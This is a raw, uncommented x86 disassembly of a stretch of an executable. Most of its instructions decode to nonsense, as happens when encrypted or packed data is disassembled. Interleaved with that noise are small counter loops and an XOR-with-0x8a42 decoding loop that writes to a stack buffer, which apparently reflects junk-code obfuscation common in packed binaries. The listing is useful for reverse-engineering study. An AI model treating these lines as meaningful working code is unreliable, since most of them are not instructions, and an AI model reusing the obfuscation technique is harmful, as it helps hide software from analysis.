  403b8f:	add    edi,DWORD PTR [eax]
  403b91:	push   edi
  403b92:	nop
  403b93:	clc    
  403b94:	push   0x85b80be5
  403b99:	push   ecx
  403b9a:	jp     0x403b4f
  403b9c:	inc    edi
  403b9d:	mul    DWORD PTR [esi]
  403b9f:	call   DWORD PTR [esp+edi*2-0x6]
  403ba3:	sar    DWORD PTR [eax-0x4f],0x85
  403ba7:	sahf   
  403ba8:	mov    dh,0xa7
  403baa:	sub    esp,DWORD PTR [edi-0x3412454]
  403bb0:	mov    ds:0x5f47e3fb,al
  403bb5:	mov    ecx,0x94add064
  403bba:	in     al,0x9c
  403bbc:	clc    
  403bbd:	xor    ebp,esp
  403bbf:	shr    DWORD PTR [eax+0x32ec3b14],cl
  403bc5:	push   0x2f
  403bc7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bc8:	sbb    esi,edi
  403bca:	jne    0x403ba3
  403bcc:	shr    DWORD PTR [edi+0x10],0xaa
  403bd0:	(bad)  
  403bd1:	jl     0x403c2c
  403bd3:	(bad)  
  403bd4:	sub    eax,0xf3cb1332
  403bd9:	jl     0x403b8d
  403bdb:	pop    esp
  403bdc:	mov    DWORD PTR [eax],esp
  403bde:	addr16 sub eax,0xf0bccb37
  403be4:	xor    eax,0xcbf6273e
  403be9:	lds    esp,FWORD PTR [ebx]
  403beb:	xchg   esi,eax
  403bec:	and    ch,dh
  403bee:	pop    esp
  403bef:	les    edx,FWORD PTR [edx]
  403bf1:	into   
  403bf2:	nop
  403bf3:	and    dl,0xd4
  403bf6:	ror    DWORD PTR [ecx+0x12b436a6],0x9b
  403bfd:	out    0xf1,eax
  403bff:	mov    ebx,0x549afc51
  403c04:	iret   
  403c05:	call   0xa0eb:0xbbf1039e
  403c0c:	adc    eax,0xd67f02e1
  403c11:	xchg   ebx,eax
  403c12:	dec    ebp
  403c13:	jge    0x403c8a
  403c15:	hlt    
  403c16:	rol    BYTE PTR [esi],0x67
  403c19:	mov    ecx,0xec898a56
  403c1e:	add    ebx,DWORD PTR [ebx+0x1407e886]
  403c24:	(bad)  
  403c25:	retf   0x1ef1
  403c28:	jmp    0x403c72
  403c2a:	outs   dx,BYTE PTR ds:[esi]
  403c2b:	adc    al,0x47
  403c2d:	inc    ecx
  403c2e:	xchg   ecx,eax
  403c2f:	jp     0x403bd6
  403c31:	or     al,0xc4
  403c33:	ins    DWORD PTR es:[edi],dx
  403c34:	xor    DWORD PTR [edi-0x6b55a662],ecx
  403c3a:	adc    dh,BYTE PTR [ebp+esi*1-0x6761bd61]
  403c41:	je     0x403c4c
  403c43:	add    DWORD PTR [edx],esp
  403c45:	loope  0x403c88
  403c47:	ins    BYTE PTR es:[edi],dx
  403c48:	sbb    ebx,edx
  403c4a:	in     al,dx
  403c4b:	xchg   esi,eax
  403c4c:	test   al,0xf9
  403c4e:	cmp    BYTE PTR [edx+0x18e8ff38],ch
  403c54:	out    dx,eax
  403c55:	inc    edx
  403c56:	inc    esi
  403c57:	pop    ecx
  403c58:	push   esp
  403c59:	jl     0x403c57
  403c5b:	mov    esp,0xc5306532
  403c60:	in     eax,0xa6
  403c62:	mov    edi,0x5c19045c
  403c67:	sub    DWORD PTR [ecx-0x6f],eax
  403c6a:	xchg   ecx,eax
  403c6b:	xchg   ebx,eax
  403c6c:	mov    edx,0xc69e16df
  403c71:	neg    edx
  403c73:	push   ebp
  403c74:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  403c7b:	mov    eax,ds:0x42c8be
  403c80:	mov    ecx,DWORD PTR ds:0x4278bb
  403c86:	sub    eax,ecx
  403c88:	sub    eax,DWORD PTR [eax+ecx*1]
  403c8b:	mov    eax,DWORD PTR [ebp-0x8]
  403c8e:	mov    ecx,0x7510857
  403c93:	push   esi
  403c94:	xor    eax,ecx
  403c96:	movzx  esi,BYTE PTR ds:0x427d03
  403c9d:	sub    DWORD PTR ds:0x4292d9,esi
  403ca3:	jmp    0x403da8
  403ca8:	cld    
  403ca9:	pop    eax
  403caa:	cwde   
  403cab:	daa    
  403cac:	pop    eax
  403cad:	out    0x93,eax
  403caf:	jnp    0x403d22
  403cb1:	or     esp,0x29
  403cb4:	cwde   
  403cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb6:	gs or  dh,al
  403cb9:	sbb    DWORD PTR [esp+edi*2+0x54],edi
  403cbd:	jl     0x403d3b
  403cbf:	jl     0x403c78
  403cc1:	pusha  
  403cc2:	push   es
  403cc3:	xchg   edx,eax
  403cc4:	pop    esp
  403cc5:	iret   
  403cc6:	scas   al,BYTE PTR es:[edi]
  403cc7:	push   esi
  403cc8:	mov    es,WORD PTR [eax-0x1cee6c87]
  403cce:	xor    eax,0x50cca8a3
  403cd3:	inc    ecx
  403cd4:	or     eax,0xa43c825c
  403cd9:	lea    ecx,[edx-0x14]
  403cdc:	call   0x7754:0x18cfbd89
  403ce3:	rol    DWORD PTR [ebp+eiz*8-0x54b8a1ac],0xe3
  403ceb:	rcl    ebx,1
  403ced:	adc    al,0xa0
  403cef:	mov    dh,0x2d
  403cf1:	outs   dx,DWORD PTR ds:[esi]
  403cf2:	cmp    DWORD PTR [eax],ecx
  403cf4:	ss cwde 
  403cf6:	sub    esi,DWORD PTR [ebx]
  403cf8:	aam    0x2d
  403cfa:	mov    DWORD PTR [ecx],eax
  403cfc:	lds    ebp,FWORD PTR [edi+esi*8+0x0]
  403d00:	or     cl,BYTE PTR [ecx+0x4eaa0ead]
  403d06:	inc    edi
  403d07:	test   eax,0x37ee702b
  403d0c:	mov    dh,0xe6
  403d0e:	inc    ebp
  403d0f:	jno    0xfd213994
  403d15:	retf   0x2e52
  403d18:	icebp  
  403d19:	not    DWORD PTR [edx]
  403d1b:	and    al,0x2b
  403d1d:	mov    esp,0xef773ff0
  403d22:	fdivr  QWORD PTR [ebp-0x522a65e4]
  403d28:	aas    
  403d29:	int    0xd1
  403d2b:	sub    DWORD PTR [ebp-0x30],0x9fd5f9c8
  403d32:	je     0x403cda
  403d34:	aas    
  403d35:	scas   al,BYTE PTR es:[edi]
  403d36:	ins    DWORD PTR es:[edi],dx
  403d37:	fild   DWORD PTR [ecx]
  403d39:	ds pusha 
  403d3b:	mov    ebp,0x52638b43
  403d40:	aaa    
  403d41:	mov    ebp,0x98c82892
  403d46:	js     0x403cfa
  403d48:	das    
  403d49:	jae    0x403dc4
  403d4b:	mov    ah,0x4e
  403d4d:	in     al,0x72
  403d4f:	jo     0x403da9
  403d51:	cmp    eax,0x26df8c41
  403d56:	push   ebp
  403d57:	pop    ebp
  403d58:	jns    0x403d67
  403d5a:	ficom  WORD PTR [ecx-0xb616916]
  403d60:	or     dh,dh
  403d62:	xchg   ebx,eax
  403d63:	mov    ebx,0xf6d104d9
  403d68:	mov    ds:0x7cf680c3,eax
  403d6d:	sub    eax,0xf3f1c905
  403d72:	ds mov esi,0xd58ae6b0
  403d78:	out    0xcb,eax
  403d7a:	sub    al,0x43
  403d7c:	aad    0x53
  403d7e:	adc    bh,BYTE PTR [edx]
  403d80:	mov    ecx,0x70b79508
  403d85:	mov    ebx,0xc9dd4593
  403d8a:	push   ecx
  403d8b:	fist   DWORD PTR [eax*4-0x1136114]
  403d92:	and    BYTE PTR [eax+0x3dce5996],al
  403d98:	imul   ecx,DWORD PTR [edi-0x4e],0xa00ab27a
  403d9f:	mov    bl,0x43
  403da1:	out    0x5e,al
  403da3:	idiv   DWORD PTR [eax]
  403da5:	imul   esi,DWORD PTR [edi+0x729ebe98],0x32
  403dac:	add    BYTE PTR [ecx+0x4275981d],al
  403db2:	add    BYTE PTR [esi+0x73],cl
  403db5:	add    BYTE PTR [eax],al
  403db7:	add    eax,esi
  403db9:	mov    DWORD PTR ds:0x4292d9,0x3d2c
  403dc3:	jmp    0x403ee9
  403dc8:	mov    DWORD PTR ds:0x4292d5,0x6a19
  403dd2:	mov    dl,BYTE PTR [ebp-0x1]
  403dd5:	jmp    0x403eda
  403dda:	sub    DWORD PTR [edi+edi*4+0x69d96176],eax
  403de1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403de2:	sub    al,0x65
  403de4:	sbb    BYTE PTR [esi],ch
  403de6:	popa   
  403de7:	ret    
  403de8:	retf   0x3ec4
  403deb:	sbb    BYTE PTR [esp+edi*2+0x54],bh
  403def:	jl     0x403e6d
  403df1:	jl     0x403d9f
  403df3:	dec    edx
  403df4:	xchg   edx,eax
  403df5:	pop    edx
  403df6:	iret   
  403df7:	pop    es
  403df8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403df9:	div    DWORD PTR [ebx+eiz*2]
  403dfc:	jmp    0x3f2c9b43
  403e01:	ins    DWORD PTR es:[edi],dx
  403e02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e03:	push   0xffffffc6
  403e05:	sub    al,0x6f
  403e07:	call   0xd6d4695
  403e0c:	push   esi
  403e0d:	sbb    edx,DWORD PTR [eax-0x3c]
  403e10:	add    ecx,DWORD PTR [ebx+esi*1+0xe]
  403e14:	xor    dl,BYTE PTR [eax-0x32d7a1fd]
  403e1a:	add    al,0x7f
  403e1c:	loope  0x403dd4
  403e1e:	cs sbb al,0xb7
  403e21:	leave  
  403e22:	mov    ebp,0x755e918d
  403e27:	mov    al,0xff
  403e29:	test   DWORD PTR [ecx+0x13b7f4c3],esi
  403e2f:	jnp    0x403db6
  403e31:	sub    al,0x54
  403e33:	rcl    BYTE PTR [esi-0x285e06d7],1
  403e39:	and    eax,0x38775855
  403e3e:	mov    DWORD PTR [eax],edx
  403e40:	test   ah,al
  403e42:	or     eax,edi
  403e44:	hlt    
  403e45:	push   edx
  403e46:	call   0x991a7c7b
  403e4b:	mov    bh,0x2a
  403e4d:	dec    eax
  403e4e:	daa    
  403e4f:	add    cl,ch
  403e51:	rcr    DWORD PTR [eax-0x5edb377d],1
  403e57:	and    BYTE PTR [ebx+0x9b2e793],cl
  403e5d:	and    BYTE PTR [ebx+0x4a],dl
  403e60:	pop    ss
  403e61:	or     BYTE PTR [esi],0x2b
  403e64:	idiv   edi
  403e66:	sbb    ecx,edi
  403e68:	repnz btr DWORD PTR [edi],0xc
  403e6d:	push   ss
  403e6e:	jp     0x403eae
  403e70:	pop    ds
  403e71:	es pop ecx
  403e73:	xchg   BYTE PTR [esi],cl
  403e75:	push   esi
  403e76:	iret   
  403e77:	inc    ebx
  403e78:	add    esp,0xb98e5921
  403e7e:	adc    bh,BYTE PTR [eax-0xb4b062f]
  403e84:	retf   0xa517
  403e87:	sti    
  403e88:	shr    al,0x29
  403e8b:	sub    eax,0x5878e327
  403e90:	rcl    BYTE PTR [ebx],1
  403e92:	push   ebp
  403e93:	sub    al,0x84
  403e95:	stos   BYTE PTR es:[edi],al
  403e96:	or     BYTE PTR [esp+ebp*1-0x5f55d1e8],ch
  403e9d:	imul   edx,edi,0x8d73fe04
  403ea3:	add    al,0x57
  403ea5:	in     eax,0x1c
  403ea7:	mov    dh,bl
  403ea9:	sbb    DWORD PTR [ebx-0x4a],ebp
  403eac:	je     0x403f14
  403eae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403eaf:	cld    
  403eb0:	test   BYTE PTR cs:[ecx],ch
  403eb3:	fcompp 
  403eb5:	std    
  403eb6:	cld    
  403eb7:	sub    edx,DWORD PTR [ebp+ebx*2+0x18]
  403ebb:	in     eax,dx
  403ebc:	dec    esi
  403ebd:	xchg   esi,edx
  403ebf:	pmullw mm0,mm3
  403ec2:	mov    cl,0xb6
  403ec4:	js     0x403f39
  403ec6:	xor    bl,bl
  403ec8:	add    al,ah
  403eca:	cmp    al,0x42
  403ecc:	(bad)  
  403ecd:	rcr    esp,1
  403ecf:	ret    
  403ed0:	sahf   
  403ed1:	mov    edi,DWORD PTR [edi+0x239ee67e]
  403ed7:	adc    eax,DWORD PTR ds:0x55488f2
  403edd:	test   al,0xc7
  403edf:	add    eax,0x427598
  403ee4:	(bad)  
  403ee6:	add    BYTE PTR [eax],al
  403ee8:	inc    eax
  403ee9:	cmp    eax,0x40
  403eec:	mov    DWORD PTR ds:0x4292cd,0x3a6f
  403ef6:	jb     0x403dc8
  403efc:	mov    edx,DWORD PTR ds:0x4292e9
  403f02:	mov    edx,DWORD PTR [edx]
  403f04:	xor    DWORD PTR ds:0x427d07,edx
  403f0a:	mov    edx,DWORD PTR [ebp-0x8]
  403f0d:	xor    eax,0x54c0
  403f12:	mov    eax,DWORD PTR [ebp-0xc]
  403f15:	xor    edx,ecx
  403f17:	adc    DWORD PTR ds:0x4275a8,0x4292d1
  403f21:	jmp    0x404026
  403f26:	push   cs
  403f27:	ds add al,0xd
  403f2a:	(bad)  
  403f2b:	fld    QWORD PTR ds:0x74fb2bdd
  403f31:	sub    esi,esi
  403f33:	pop    esi
  403f34:	mov    ebp,0x7c1b16c7
  403f39:	jl     0x403f8f
  403f3b:	jl     0x403fb9
  403f3d:	jl     0x403ecc
  403f3f:	xor    ah,BYTE PTR [ebx]
  403f41:	shr    BYTE PTR [ecx],1
  403f43:	sbb    cl,BYTE PTR [edx+eax*1-0x2f]
  403f47:	jmp    0x400d2a53
  403f4c:	cmc    
  403f4d:	cmp    cl,ch
  403f4f:	cdq    
  403f50:	retf   
  403f51:	sbb    DWORD PTR [ebp+0x84d9740],esp
  403f57:	push   ss
  403f58:	push   eax
  403f59:	lahf   
  403f5a:	and    dh,BYTE PTR [ebp+0x28bcc24]
  403f60:	popf   
  403f61:	mov    ebp,0xb93b3cdc
  403f66:	imul   esi,esi,0x4aad76d
  403f6c:	push   esi
  403f6d:	push   ebx
  403f6e:	sub    al,0x38
  403f70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f71:	repz inc ebp
  403f73:	imul   ecx,DWORD PTR [eax-0x6],0x6a579a91
  403f7a:	popf   
  403f7b:	xor    ecx,esi
  403f7d:	mov    ch,0x5b
  403f7f:	scas   al,BYTE PTR es:[edi]
  403f80:	call   0x15b33c98
  403f85:	ss sbb eax,0x258d5622
  403f8b:	mov    edi,0xc414daab
  403f90:	pop    eax
  403f91:	clc    
  403f92:	shl    al,cl
  403f94:	inc    ecx
  403f95:	pop    ebp
  403f96:	inc    esi
  403f97:	push   ss
  403f98:	rcr    DWORD PTR [ecx-0x15ddbad3],cl
  403f9e:	push   ds
  403f9f:	fwait
  403fa0:	jno    0x403fea
  403fa2:	bnd jl 0x403fe7
  403fa5:	jnp    0x403fb7
  403fa7:	ret    
  403fa8:	shl    DWORD PTR [edi],cl
  403faa:	inc    edi
  403fab:	popa   
  403fac:	loop   0x403f34
  403fae:	test   eax,0x44936f3b
  403fb3:	jge    0x40402c
  403fb5:	pop    eax
  403fb6:	inc    esi
  403fb7:	dec    eax
  403fb8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403fb9:	aas    
  403fba:	cli    
  403fbb:	rol    BYTE PTR [esi-0x2ba7c723],cl
  403fc1:	(bad)  
  403fc2:	pop    ecx
  403fc3:	cmp    cl,BYTE PTR [esi]
  403fc5:	in     eax,0x92
  403fc7:	cmp    edx,DWORD PTR [ecx-0x576734b0]
  403fcd:	pop    ss
  403fce:	sbb    al,0x39
  403fd0:	lea    esp,[esi+0x6]
  403fd3:	aaa    
  403fd4:	fstp   st(0)
  403fd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fd7:	jae    0x403fb5
  403fd9:	and    al,0xc7
  403fdb:	dec    esp
  403fdc:	iret   
  403fdd:	cld    
  403fde:	xchg   ecx,eax
  403fdf:	dec    ecx
  403fe0:	add    BYTE PTR [ebp-0x6d],dh
  403fe3:	jg     0x40400d
  403fe5:	and    DWORD PTR [ebx-0x42d50891],ebx
  403feb:	jbe    0x404052
  403fed:	or     ebp,0xf51a310
  403ff3:	xchg   ebx,eax
  403ff4:	mov    ss,WORD PTR [ebx]
  403ff6:	in     al,0x68
  403ff8:	or     ebx,DWORD PTR [ebp-0x4e714628]
  403ffe:	hlt    
  403fff:	(bad)  
  404000:	mov    bl,0xbf
  404002:	repnz aaa 
  404004:	jle    0x404060
  404006:	rcl    BYTE PTR [ebp-0x53],cl
  404009:	lods   eax,DWORD PTR ds:[esi]
  40400a:	xchg   BYTE PTR [eax],bl
  40400c:	cmp    DWORD PTR [ebx-0x2d],esp
  40400f:	mov    cl,0xe8
  404011:	mov    ds:0x899fb234,eax
  404016:	out    dx,al
  404017:	push   edi
  404018:	sub    bh,BYTE PTR [edi+0x1a]
  40401b:	mov    bh,0x97
  40401d:	(bad)  
  40401e:	pop    edi
  40401f:	sub    ch,BYTE PTR [edi-0x1d423bb9]
  404025:	inc    esp
  404026:	add    edx,esi
  404028:	mov    DWORD PTR ds:0x42c88a,0x7aaf
  404032:	cmp    edx,eax
  404034:	mov    DWORD PTR ds:0x4292c1,0x7e3a
  40403e:	je     0x4043e5
  404044:	and    DWORD PTR ds:0x42c88a,0x0
  40404e:	mov    eax,ds:0x42c88a
  404053:	inc    eax
  404054:	mov    ds:0x42c88a,eax
  404059:	cmp    DWORD PTR ds:0x42c88a,0xa
  404060:	jne    0x404071
  404066:	push   0x1f92
  40406b:	call   DWORD PTR ds:0x427c47
  404071:	cmp    DWORD PTR ds:0x42c88a,0x9
  404078:	jne    0x404089
  40407e:	mov    eax,ds:0x42c88a
  404083:	inc    eax
  404084:	mov    ds:0x42c88a,eax
  404089:	cmp    DWORD PTR ds:0x42c88a,0x1a
  404090:	jb     0x40404e
  404096:	push   ebx
  404097:	jmp    0x40419c
  40409c:	mov    fs,WORD PTR [edi]
  40409e:	mov    al,0x47
  4040a0:	ins    DWORD PTR es:[edi],dx
  4040a1:	jnp    0x404040
  4040a3:	stc    
  4040a4:	sbb    al,ch
  4040a6:	(bad)  
  4040a7:	nop
  4040a8:	mov    esp,ebx
  4040aa:	aas    
  4040ab:	add    BYTE PTR [esi],cl
  4040ad:	sbb    bh,BYTE PTR [esp+edi*2+0x54]
  4040b1:	jl     0x40412f
  4040b3:	jl     0x404091
  4040b5:	pop    ecx
  4040b6:	pusha  
  4040b7:	jno    0x404110
  4040b9:	out    dx,eax
  4040ba:	retf   
  4040bb:	pop    es
  4040bc:	sbb    ebx,eax
  4040be:	adc    BYTE PTR [ecx-0x140a38aa],0x52
  4040c5:	add    ah,BYTE PTR [edi-0x7f]
  4040c8:	adc    DWORD PTR [esi],0xffffffec
  4040cb:	retf   0x2d9d
  4040ce:	or     BYTE PTR [eax],al
  4040d0:	sub    DWORD PTR [edi-0xbe51982],esi
  4040d6:	xchg   esp,eax
  4040d7:	stc    
  4040d8:	(bad)  
  4040d9:	shr    ebx,cl
  4040db:	inc    edx
  4040dc:	nop
  4040dd:	punpcklbw mm4,DWORD PTR [edi+0x335b4c44]
  4040e4:	in     al,dx
  4040e5:	sub    esi,ecx
  4040e7:	jo     0x404168
  4040e9:	int3   
  4040ea:	xor    eax,DWORD PTR [ebp+ebp*2-0x2e]
  4040ee:	les    esp,FWORD PTR [esi+0x761af79a]
  4040f4:	inc    edi
  4040f5:	inc    esi
  4040f6:	or     BYTE PTR [ebp+ebp*1-0x66d89fd4],bh
  4040fd:	pop    esp
  4040fe:	xchg   esi,ecx
  404100:	sub    dl,BYTE PTR [ecx]
  404102:	inc    edx
  404103:	lods   al,BYTE PTR ds:[esi]
  404104:	pop    ss
  404105:	in     al,dx
  404106:	ins    DWORD PTR es:[edi],dx
  404107:	xchg   dh,ch
  404109:	and    eax,0x138223a4
  40410e:	or     bl,BYTE PTR [ecx]
  404110:	sti    
  404111:	ds adc eax,0x5b1e9a6b
  404117:	sbb    al,0xec
  404119:	in     eax,dx
  40411a:	mov    cr6,esi
  40411d:	dec    ebx
  40411e:	imul   esp,DWORD PTR [eax],0x2c
  404121:	xor    al,cl
  404123:	mov    dl,0x16
  404125:	xchg   edx,eax
  404126:	call   0x36bd:0x1cb0e3b3
  40412d:	imul   esi,ebx,0x33
  404130:	sub    ch,BYTE PTR [ebp+eiz*8+0x28885d7c]
  404137:	dec    esi
  404138:	pop    esi
  404139:	sar    bl,0x65
  40413c:	cmp    BYTE PTR [ecx],0x69
  40413f:	cmp    eax,0xfdc9b853
  404144:	sub    dh,BYTE PTR [esi]
  404146:	or     bl,BYTE PTR [edx+0x25455cd5]
  40414c:	into   
  40414d:	lock sbb ch,BYTE PTR [eax-0x3e929fbf]
  404154:	inc    DWORD PTR [eax]
  404156:	push   0xfc9fa9e8
  40415b:	sub    eax,0x6afd39e6
  404160:	popf   
  404161:	mov    dl,0x32
  404163:	pop    ecx
  404164:	mov    BYTE PTR [ecx+0x36],ch
  404167:	pop    esp
  404168:	mov    al,ds:0xd7ee3c31
  40416d:	sar    DWORD PTR [eax-0x462f960c],cl
  404173:	call   0x90a6:0x289a3e3d
  40417a:	lock and bl,BYTE PTR [esi]
  40417d:	(bad)  
  40417e:	xchg   ebp,eax
  40417f:	lods   eax,DWORD PTR ds:[esi]
  404180:	dec    ecx
  404181:	test   BYTE PTR [eax-0x2119979b],dh
  404187:	inc    edi
  404188:	ja     0x40413f
  40418a:	push   ebx
  40418b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40418c:	and    al,0x64
  40418e:	mov    DWORD PTR [edx+eax*1],eax
  404191:	xchg   esp,eax
  404192:	adc    bh,BYTE PTR [edx+0x6]
  404195:	test   al,bh
  404197:	je     0x40412b
  404199:	mov    edx,0x8b574cb5
  40419e:	jge    0x4041a8
  4041a0:	mov    eax,0x8a42
  4041a5:	xor    ax,WORD PTR [edi+edx*4+0x2]
  4041aa:	jmp    0x4042af
  4041af:	sbb    eax,0x673c6c22
  4041b4:	mov    dl,0xbd
  4041b6:	std    
  4041b7:	adc    ah,BYTE PTR [ebx-0x5037c5f8]
  4041bd:	sahf   
  4041be:	ja     0x404226
  4041c0:	sbb    bh,BYTE PTR [esp+edi*2+0x54]
  4041c4:	jl     0x404242
  4041c6:	jl     0x4041a8
  4041c8:	pop    eax
  4041c9:	jg     0x40418f
  4041cb:	cmp    dh,bl
  4041cd:	ror    BYTE PTR [edx+eax*2-0x6a],1
  4041d1:	fs push ebx
  4041d3:	jb     0x4041f1
  4041d5:	mov    dh,0xff
  4041d7:	repnz sbb al,BYTE PTR [eax+edi*8+0xa]
  4041dc:	mov    esi,0xf9b47a66
  4041e1:	dec    esi
  4041e2:	jmp    DWORD PTR [ebp+0x17]
  4041e5:	cmp    BYTE PTR [edx+0x17],ah
  4041e8:	inc    ebp
  4041e9:	cmp    BYTE PTR [esi-0x67],dl
  4041ec:	jnp    0x40420c
  4041ee:	arpl   WORD PTR [ebx-0x5],ax
  4041f1:	mov    eax,ds:0xac1010e8
  4041f6:	xchg   bl,al
  4041f8:	add    DWORD PTR [ebp-0x3],ecx
  4041fb:	cmp    eax,0xe29f04d2
  404200:	xor    edx,DWORD PTR [ebx-0x169fc13a]
  404206:	daa    
  404207:	xchg   edx,eax
  404208:	dec    esi
  404209:	stos   DWORD PTR es:[edi],eax
  40420a:	loopne 0x404248
  40420c:	(bad)
  40420f:	div    BYTE PTR [eax+edi*1-0x28ed6c80]
  404216:	out    dx,eax
  404217:	jnp    0x404214
  404219:	xor    DWORD PTR [ecx+0x5cfac8cb],ecx
  40421f:	lahf   
  404220:	imul   esp,DWORD PTR ds:0xc2d6bbf,0xffffff92
  404227:	int3   
  404228:	fstp   DWORD PTR [edx-0x10689d7a]
  40422e:	and    al,bl
  404230:	shr    esp,0x19
  404233:	lds    edi,FWORD PTR [edx+0x24]
  404236:	sbb    DWORD PTR [ebx],esi
  404238:	(bad)  
  404239:	jg     0x4041cd
  40423b:	cmp    cl,ah
  40423d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40423e:	mov    bh,0x4c
  404240:	dec    ebp
  404241:	adc    BYTE PTR [di+0x7],cl
  404245:	imul   esi,DWORD PTR [ebx+0x7b003f],0xd921d13b
  40424f:	out    dx,al
  404250:	mov    ah,0x5e
  404252:	mov    cs,WORD PTR [ebx+ebx*8-0x724bcdc2]
  404259:	cs icebp 
  40425b:	mov    DWORD PTR [esi+0x76a7f97e],ecx
  404261:	sub    dh,BYTE PTR [edx+ebp*2+0x4b97f82c]
  404268:	dec    edi
  404269:	mov    ds:0xa191662c,al
  40426e:	and    dh,BYTE PTR [edx]
  404270:	fwait
  404271:	jmp    0xc792:0xff55cbc9
  404278:	add    ah,BYTE PTR [ebx+ebx*8-0x4e]
  40427c:	loop   0x4042f0
  40427e:	iret   
  40427f:	pop    esi
  404280:	or     esp,esp
  404282:	push   es
  404283:	and    edx,DWORD PTR [ecx+eiz*8+0x5]
  404287:	stos   DWORD PTR es:[edi],eax
  404288:	cs mov bh,0x10
  40428b:	lea    eax,[bp+di-0x1ee]
  404290:	scas   eax,DWORD PTR es:[edi]
  404291:	dec    edi
  404292:	or     ch,BYTE PTR [ebp+0x33]
  404295:	pop    ebx
  404296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404297:	loope  0x40421a
  404299:	outs   dx,DWORD PTR ds:[esi]
  40429a:	push   cs
  40429b:	or     eax,DWORD PTR [esi+0x3e]
  40429e:	mov    edi,0xc10fd41e
  4042a3:	push   cs
  4042a4:	inc    ebp
  4042a5:	jne    0x4042ea
  4042a7:	sub    esi,eax
  4042a9:	(bad)  
  4042ab:	out    dx,eax
  4042ac:	adc    eax,DWORD PTR [edx-0x1d]
  4042af:	mov    edi,0x3b08
  4042b4:	add    ax,di
  4042b7:	movzx  eax,ax
  4042ba:	mov    DWORD PTR [ebp-0x14],eax
  4042bd:	mov    eax,DWORD PTR [ebp+0x8]
  4042c0:	movzx  eax,WORD PTR [eax+edx*4]
  4042c4:	xor    eax,0x8a42
  4042c9:	add    eax,edi
  4042cb:	mov    edi,DWORD PTR [ebp-0x14]
  4042ce:	mov    BYTE PTR [ebp+edi*1-0x58],al
  4042d2:	mov    eax,DWORD PTR [ebp-0xc]
  4042d5:	inc    edx
  4042d6:	cmp    edx,eax
  4042d8:	jmp    0x4043dd
  4042dd:	daa    
  4042de:	mov    edi,0x79794fe9
  4042e3:	mov    ecx,0xc966f157
  4042e8:	dec    esi
  4042e9:	(bad)  
  4042ea:	clc    
  4042eb:	icebp  
  4042ec:	sbb    al,0x5e
  4042ee:	sbb    eax,0x7c547c7c
  4042f3:	jl     0x404371
  4042f5:	jmp    0x4042f7
  4042f7:	xchg   BYTE PTR [eax+0x244a20cd],al
  4042fd:	xchg   edx,eax
  4042fe:	pop    es
  4042ff:	(bad)  
  404300:	punpckhdq mm5,QWORD PTR [esi-0x5ed73ca8]
  404307:	iret   
  404308:	adc    al,0xac
  40430a:	sub    dh,bh
  40430c:	xchg   DWORD PTR [esi],edi
  40430e:	jl     0x4042d1
  404310:	jmp    0xfb5b9860
  404315:	iret   
  404316:	mov    al,0x68
  404318:	test   al,0x45
  40431a:	in     eax,0x86
  40431c:	add    al,0x34
  40431e:	mov    edx,DWORD PTR [eax+edx*2]
  404321:	pusha  
  404322:	mov    dh,0x48
  404324:	arpl   WORD PTR [esi],si
  404326:	adc    BYTE PTR [ecx],dl
  404328:	mov    al,0x5f
  40432a:	mov    al,ds:0x71c2ff
  40432f:	ds adc ah,bl
  404332:	shl    DWORD PTR [esi],cl
  404334:	int3   
  404335:	rcl    DWORD PTR [ebp-0x44cb7487],1
  40433b:	mov    dh,0xf
  40433d:	nop
  40433e:	pop    es
  40433f:	sbb    ebx,DWORD PTR [ebp+0x69]
  404342:	sbb    eax,0xde00d7ec
  404347:	inc    eax
  404348:	xchg   edx,eax
  404349:	iret   
  40434a:	dec    DWORD PTR [edi]
  40434c:	(bad)  
  40434d:	stos   DWORD PTR es:[edi],eax
  40434e:	(bad)  
  40434f:	aam    0xe3
  404351:	sub    BYTE PTR [ebp-0x1a],dh
  404354:	inc    esp
  404355:	int3   
  404356:	ja     0x4043b0
  404358:	lea    esi,[ebp-0x2350d1d2]
  40435e:	sbb    edx,DWORD PTR [edi-0x34]
  404361:	xchg   esp,eax
  404362:	outs   dx,DWORD PTR ds:[esi]
  404363:	mov    dh,0x49
  404365:	push   0xb3e26f4b
  40436a:	ins    DWORD PTR es:[edi],dx
  40436b:	(bad)  
  40436d:	jae    0x40430d
  40436f:	(bad)  
  404370:	xchg   ebx,eax
  404371:	dec    eax
  404372:	jae    0x404360
  404374:	dec    ebp
  404375:	scas   eax,DWORD PTR es:[edi]
  404376:	xchg   edi,eax
  404377:	cmc    
  404378:	scas   al,BYTE PTR es:[edi]
  404379:	push   es
  40437a:	scas   al,BYTE PTR es:[edi]
  40437b:	dec    eax
  40437c:	lds    esp,FWORD PTR [edi+0x18ed7158]
  404382:	or     al,0xfb
  404384:	mov    esp,0xc3ff8f18
  404389:	js     0x4043fa
  40438b:	cld    
  40438c:	pop    ds
  40438d:	repnz addr16 cmp ebp,ebx
  404391:	mov    ss,WORD PTR [eax]
  404393:	mov    ds:0xdc1f0e33,eax
  404398:	loope  0x404408
  40439a:	jecxz  0x404353
  40439c:	imul   BYTE PTR [ebp+0x186973b6]
  4043a2:	loopne 0x404422
  4043a4:	sahf   
  4043a5:	push   ss
  4043a6:	aas    
  4043a7:	pusha  
  4043a8:	mov    esi,0x57f76cb1
  4043ad:	(bad)  
  4043ae:	jmp    0x4043ca
  4043b0:	push   eax
  4043b1:	inc    DWORD PTR [esi+ebp*4+0x69]
  4043b5:	fst    st(2)
  4043b7:	loop   0x404357
  4043b9:	jl     0x4043b0
  4043bb:	dec    ebx
  4043bc:	pop    ss
  4043bd:	inc    esi
  4043be:	test   eax,0xbc5a5610
  4043c3:	mov    DWORD PTR [edi+0x779c3fd7],ebp
  4043c9:	adc    eax,0x1271e098
  4043ce:	or     dh,BYTE PTR [ecx]
  4043d0:	mov    al,0xf6
